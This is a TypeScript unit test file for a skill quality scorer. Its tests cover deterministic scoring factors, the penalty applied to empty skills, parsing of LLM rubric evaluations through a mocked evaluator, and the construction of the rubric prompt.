describe('SkillQualityScorer', () => {
  const makeSkill = (overrides?: Partial<Skill>): Skill => ({
    id: 'test-skill',
    name: 'test-skill',
    description: 'A test skill',
    content: '# Test Skill\n\nDo something useful.\n\n```python\nprint("hello")\n```',
    tools: ['web_search'],
    metadata: {
      category: 'coding',
      tags: ['test', 'example'],
      source: 'user',
      qualityScore: 0.5,
      usageCount: 5,
      avgSuccessRate: 0.8,
      autoGenerated: false,
      pinned: false,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    },
    ...overrides,
  });

  it('computeDeterministicScore returns factors and total', () => {
    const skill = makeSkill();
    const result = computeDeterministicScore(skill);
    assert.ok(result.total >= 0 && result.total <= 1, 'Score should be 0-1');
    assert.ok(result.factors.length >= 4, 'Should have multiple factors');
    const hasTools = result.factors.find((f) => f.name === 'has_tools');
    assert.ok(hasTools, 'Should include has_tools factor');
    assert.strictEqual(hasTools!.score, 1, 'Skills with tools should score 1 on has_tools');
  });

  it('computeDeterministicScore penalizes empty skills', () => {
    const empty = makeSkill({
      content: 'minimal',
      description: 'minimal',
      tools: [],
      metadata: {
        category: 'general',
        tags: [],
        source: 'user',
        qualityScore: 0.5,
        usageCount: 0,
        avgSuccessRate: 0.5,
        autoGenerated: false,
        pinned: false,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      },
    });
    const result = computeDeterministicScore(empty);
    assert.ok(result.total < 0.5, 'Empty skills should score below 0.5');
  });

  it('evaluateWithRubric returns null when evaluator fails', async () => {
    const skill = makeSkill();
    const config: LLMRubricConfig = {
      criteria: [{ name: 'clarity', description: 'Clear instructions?', score: 0, weight: 1.0 }],
      evaluator: async () => null,
    };
    const result = await evaluateWithRubric(skill, config);
    assert.strictEqual(result, null, 'Should return null on evaluator failure');
  });

  it('evaluateWithRubric parses valid LLM responses', async () => {
    const skill = makeSkill();
    const config: LLMRubricConfig = {
      criteria: [
        { name: 'clarity', description: 'Clear?', score: 0, weight: 0.5 },
        { name: 'actionability', description: 'Actionable?', score: 0, weight: 0.5 },
      ],
      evaluator: async () => [0.9, 0.7],
    };
    const factors = await evaluateWithRubric(skill, config);
    assert.ok(factors !== null, 'Should return factors');
    assert.strictEqual(factors!.length, 2);
    assert.strictEqual(factors![0].name, 'llm_clarity');
    assert.strictEqual(factors![0].score, 0.9);
    assert.strictEqual(factors![1].score, 0.7);
  });

  it('buildRubricPrompt includes skill content and criteria', () => {
    const skill = makeSkill();
    const criteria = [{ name: 'clarity', description: 'Is it clear?', score: 0, weight: 1.0 }];
    const prompt = buildRubricPrompt(skill, criteria);
    assert.ok(prompt.includes('test-skill'), 'Should include skill name');
    assert.ok(prompt.includes('clarity'), 'Should include criterion name');
    assert.ok(prompt.includes('JSON array'), 'Should include format instruction');
  });
});

